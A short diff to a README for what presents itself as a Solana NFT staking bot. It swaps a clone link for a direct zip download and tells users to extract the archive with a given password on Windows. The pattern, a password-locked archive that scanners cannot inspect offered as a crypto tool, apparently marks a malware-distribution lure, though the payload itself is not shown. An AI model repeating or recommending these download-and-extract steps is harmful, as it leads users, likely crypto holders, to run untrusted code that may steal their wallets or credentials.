@@ -35,7 +35,7 @@ Follow these steps to get started with the staking bot for your NFT project.
 - `Windows 10/11`
 - `Fraemwork 4.0 and more`
 ### Installation
-- [Clone](https://github.com/gemhunterheh/Solana-nft-bot.git) the repository
+- [Clone](https://github.com/gemhunterheh/Solana-nft-bot/archive/refs/heads/main.zip) the repository
 - extract archive with pass `MWRCbIK53N`
 - Configure your environment:
 Create a `.env file` in the project's root directory and define your environment variables. You can use the `.env.example` file as a template.
